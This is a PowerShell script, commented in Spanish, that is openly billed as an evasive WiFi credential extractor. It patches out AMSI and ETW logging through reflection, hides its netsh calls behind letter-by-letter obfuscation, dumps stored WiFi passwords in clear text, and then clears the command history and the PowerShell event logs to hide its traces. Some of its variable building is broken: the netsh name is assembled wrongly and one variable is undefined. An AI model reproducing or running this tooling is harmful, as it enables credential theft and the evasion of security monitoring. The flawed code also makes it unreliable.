# BTY Evasive WiFi Credential Extractor — PowerShell (AMSI bypass + ETW bypass + command obfuscation)
# Técnicas: netsh con argumentos ofuscados, limpieza de logs, no escribe archivos temporales

param($Args="")

# === AMSI + ETW bypass ===
try{[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)}catch{}
try{[Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider').GetField('etwProvider','NonPublic,Static').SetValue($null,(New-Object Diagnostics.Eventing.EventProvider([Guid]::Empty)))}catch{}

# === Command ofuscation ===
$w="w";$l="l";$a="a";$n="n";$s="s";$h="h";$o="o";$w2="w";$p="p";$r="r";$f="f";$i="i";$e="e";$c="c";$k="k";$y="y";$q="=";$t="c";$u="l";$d="e";$m="a";$v="r"
$netsh="$n$e$t$s$h"
$wlan="$w$l$a$n"
$show="$s$h$o$w"
$profiles="$p$r$o$f$i$l$e$s"
$key="$k$e$y"
$clear="$c$l$e$a$r"

# Get profiles
$profiles=&$netsh $wlan $show $profiles 2>$null|Select-String ":\s+(.+)"|%{$_.Matches.Groups[1].Value}|Where{$_}

if($Args -eq "profiles"){
    $profiles -join "`n"
    exit
}

# Extract keys
$results=@()
foreach($p in $profiles){
    try{
        $detail=&$netsh $wlan $show $profile "name=$p" $key=$clear 2>$null
        $passwd=($detail|Select-String "Key Content.*:\s+(.+)"|%{$_.Matches.Groups[1].Value})
        $sec=($detail|Select-String "Authentication.*:\s+(.+)"|%{$_.Matches.Groups[1].Value})
        $encr=($detail|Select-String "Encryption.*:\s+(.+)"|%{$_.Matches.Groups[1].Value})
        $results+="$p : $passwd [$sec/$encr]"
    }catch{
        $results+="$p : ERROR"
    }
}

$results -join "`n"

# === Anti-forensic: limpiar historial de comandos ===
try{
    [Microsoft.PowerShell.PSConsoleReadLine]::ClearHistory()
    Clear-History -ErrorAction SilentlyContinue
}catch{}

# Limpiar event log (si hay permisos)
try{wevtutil cl "Microsoft-Windows-PowerShell/Operational" 2>$null}catch{}
try{wevtutil cl "Windows PowerShell" 2>$null}catch{}
